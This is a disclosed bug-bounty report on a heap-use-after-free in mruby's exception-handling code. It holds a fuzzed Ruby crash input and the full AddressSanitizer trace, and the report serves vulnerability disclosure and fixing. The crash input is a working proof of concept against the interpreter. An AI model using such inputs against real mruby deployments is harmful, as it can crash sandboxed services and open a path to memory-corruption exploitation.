# heap-use-after-free in OP_RESCUE

## Report Details
- **Report ID**: 295276
- **URL**: https://hackerone.com/reports/295276
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-12-05T03:30:47.442Z
- **Disclosed**: 2018-01-17T22:43:47.782Z

## Reporter
- **Username**: ahihi
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
The following input demonstrates a crash:
```
def e
	proc
ensure z rescue 
	yield 
end

e { 
	Class * def * x
	new { 
		Class * 0
	} 
	ensure 0[] = 00end rescue 
	0
} rescue
z
```
ASAN report
```
./mruby/bin/mruby out.rb
=================================================================
==10040==ERROR: AddressSanitizer: heap-use-after-free on address 0x61d000001ec0 at pc 0x00010366ff4a bp 0x7ffeec9d44b0 sp 0x7ffeec9d3c60
WRITE of size 16 at 0x61d000001ec0 thread T0
    #0 0x10366ff49 in __asan_memcpy (libclang_rt.asan_osx_dynamic.dylib:x86_64h+0x50f49)
    #1 0x1032c6b9c in mrb_vm_exec vm.c:1292
    #2 0x1032bf1b4 in mrb_vm_run vm.c:930
    #3 0x1032f5f5c in mrb_top_run vm.c:2964
    #4 0x1034b4ac0 in mrb_load_exec parse.y:5840
    #5 0x1034b58e5 in mrb_load_file_cxt parse.y:5849
    #6 0x10322486c in main mruby.c:227
    #7 0x7fff7ab3e144 in start (libdyld.dylib:x86_64+0x1144)

0x61d000001ec0 is located 64 bytes inside of 2048-byte region [0x61d000001e80,0x61d000002680)
freed by thread T0 here:
    #0 0x1036782d0 in wrap_realloc (libclang_rt.asan_osx_dynamic.dylib:x86_64h+0x592d0)
    #1 0x1032ab6f5 in mrb_default_allocf state.c:55
    #2 0x1033bf138 in mrb_realloc_simple gc.c:206
    #3 0x1033bf8fa in mrb_realloc gc.c:220
    #4 0x1032f6a04 in stack_extend_alloc vm.c:186
    #5 0x1032b4def in stack_extend vm.c:207
    #6 0x1032bbb30 in mrb_yield_with_class vm.c:730
    #7 0x103274355 in mrb_class_initialize class.c:1613
    #8 0x1032b2fc2 in mrb_funcall_with_block vm.c:481
    #9 0x10327372a in mrb_class_new_class class.c:1633
    #10 0x1032cb789 in mrb_vm_exec vm.c:1456
    #11 0x1032bf1b4 in mrb_vm_run vm.c:930
    #12 0x1032b59d4 in mrb_run vm.c:2950
    #13 0x1032bc435 in mrb_yield_with_class vm.c:744
    #14 0x103274355 in mrb_class_initialize class.c:1613
    #15 0x1032b2fc2 in mrb_funcall_with_block vm.c:481
    #16 0x10327372a in mrb_class_new_class class.c:1633
    #17 0x1032cb789 in mrb_vm_exec vm.c:1456
    #18 0x1032bf1b4 in mrb_vm_run vm.c:930
    #19 0x1032b59d4 in mrb_run vm.c:2950
    #20 0x1032bc435 in mrb_yield_with_class vm.c:744
    #21 0x103274355 in mrb_class_initialize class.c:1613
    #22 0x1032b2fc2 in mrb_funcall_with_block vm.c:481
    #23 0x10327372a in mrb_class_new_class class.c:1633
    #24 0x1032cb789 in mrb_vm_exec vm.c:1456
    #25 0x1032bf1b4 in mrb_vm_run vm.c:930
    #26 0x1032b59d4 in mrb_run vm.c:2950
    #27 0x1032bc435 in mrb_yield_with_class vm.c:744
    #28 0x103274355 in mrb_class_initialize class.c:1613
    #29 0x1032b2fc2 in mrb_funcall_with_block vm.c:481

previously allocated by thread T0 here:
    #0 0x1036782d0 in wrap_realloc (libclang_rt.asan_osx_dynamic.dylib:x86_64h+0x592d0)
    #1 0x1032ab6f5 in mrb_default_allocf state.c:55
    #2 0x1033bf138 in mrb_realloc_simple gc.c:206
    #3 0x1033bf8fa in mrb_realloc gc.c:220
    #4 0x1033c03d3 in mrb_malloc gc.c:242
    #5 0x1033c046d in mrb_calloc gc.c:260
    #6 0x1032b3d42 in stack_init vm.c:126
    #7 0x1032b05eb in mrb_funcall_with_block vm.c:415
    #8 0x1032afee9 in mrb_funcall_with_block vm.c:393
    #9 0x1032af617 in mrb_funcall_argv vm.c:498
    #10 0x10326cac1 in mrb_obj_new class.c:1601
    #11 0x10335f1c5 in mrb_exc_new_str error.c:32
    #12 0x103368881 in mrb_init_exception error.c:506
    #13 0x1032ae3f4 in mrb_init_core init.c:42
    #14 0x1032ab687 in mrb_open_core state.c:42
    #15 0x1032ab85c in mrb_open_allocf state.c:102
    #16 0x1032ab827 in mrb_open state.c:94
    #17 0x103223757 in main mruby.c:171
    #18 0x7fff7ab3e144 in start (libdyld.dylib:x86_64+0x1144)

SUMMARY: AddressSanitizer: heap-use-after-free (libclang_rt.asan_osx_dynamic.dylib:x86_64h+0x50f49) in __asan_memcpy
Shadow bytes around the buggy address:
  0x1c3a00000380: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x1c3a00000390: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x1c3a000003a0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x1c3a000003b0: fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x1c3a000003c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
=>0x1c3a000003d0: fd fd fd fd fd fd fd fd[fd]fd fd fd fd fd fd fd
  0x1c3a000003e0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x1c3a000003f0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x1c3a00000400: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x1c3a00000410: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x1c3a00000420: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==10040==ABORTING
Abort trap: 6
```

## Impact

Crashed on both mruby and mirb

## Attachments
- out.rb
